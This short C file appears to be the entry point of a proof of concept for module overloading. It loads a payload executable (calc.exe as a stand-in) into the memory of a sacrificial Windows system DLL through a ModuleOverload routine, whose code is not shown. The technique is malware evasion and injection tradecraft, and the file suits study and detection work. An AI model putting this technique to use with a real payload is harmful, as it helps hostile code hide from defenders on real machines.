#include "box.h"

#define SACRIFICAL_DLL	"C:\\Windows\\System32\\WsmSvc.dll"
#define PAYLOAD_PE		"C:\\Windows\\System32\\calc.exe"

int main()
{

	if (!ModuleOverload(PAYLOAD_PE, SACRIFICAL_DLL))
	{
		PRINT_ERROR("ModuleOverload");
		return 1;
	}

	OKAY("DONE!");

	CHAR("Quit...");
	getchar();

	return 0;

}